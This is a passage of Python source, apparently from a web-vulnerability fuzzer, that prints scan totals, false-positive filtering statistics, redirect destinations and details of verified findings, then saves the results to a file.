    print(f"Parameters tested: {summary.parameters_tested}")
    print(f"Total requests: {summary.total_requests}")
    print(f"Vulnerabilities found: {len(summary.findings)}")

    # Print FP detection stats
    stats = fuzzer.get_stats()
    if enable_fp and stats:
        print(f"\nFalse Positive Detection Stats:")
        print(f"  Total detections analyzed: {stats.get('total_detections', 0)}")
        print(f"  False positives filtered: {stats.get('false_positives_filtered', 0)}")
        print(f"  Verified findings: {stats.get('verified_findings', 0)}")

        if 'redirects' in stats:
            redir = stats['redirects']
            if redir.get('common_destinations'):
                print(f"\n  Common redirect destinations (likely auth/middleware):")
                for dest in redir['common_destinations'][:5]:
                    print(f"    - {dest}")

    if summary.findings:
        print("\nVERIFIED FINDINGS:")
        for finding in summary.findings:
            print(f"\n  [{finding.severity.upper()}] {finding.vuln_type}")
            print(f"    Parameter: {finding.parameter}")
            print(f"    Payload: {finding.payload}")
            print(f"    Confidence: {finding.confidence}")
            print(f"    Evidence: {finding.evidence}")
            if finding.verified:
                print(f"    Status: VERIFIED")

    if args.output:
        save_fuzz_results(summary, args.output, fuzzer.get_stats())
